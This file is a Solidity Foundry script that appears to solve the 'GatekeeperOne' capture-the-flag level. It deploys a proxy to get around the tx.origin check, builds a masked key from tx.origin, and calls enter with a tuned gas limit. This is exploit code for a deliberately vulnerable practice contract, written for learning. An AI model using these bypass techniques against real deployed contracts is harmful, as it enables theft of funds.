// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "lib/forge-std/src/Script.sol";
import "forge-std/console2.sol";
import "src/GatekeeperOne/GatekeeperOne.sol";


contract GatekeeperOneProxy {
  address INSTANCE_LEVEL_ADDRESS = 0x8C294E3E5A4c3b77ef42263a47708B2ebD6Ea23f;
  function run (uint256 gasLimit)external{
    GatekeeperOne gatekeeperOne = GatekeeperOne(payable(INSTANCE_LEVEL_ADDRESS));
    bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
    gatekeeperOne.enter{ gas:gasLimit }(key);
  }
}

contract GatekeeperOneScript is Script {
  function run() external{
    address INSTANCE_PROXY_ADDRESS = 0xa706AeEE60ad11888F9d0E5252CEE03E85000485;
    vm.startBroadcast();
    GatekeeperOneProxy gatekeeperOneProxy = GatekeeperOneProxy(payable(INSTANCE_PROXY_ADDRESS));
    gatekeeperOneProxy.run(1000);
    vm.stopBroadcast();
  }
}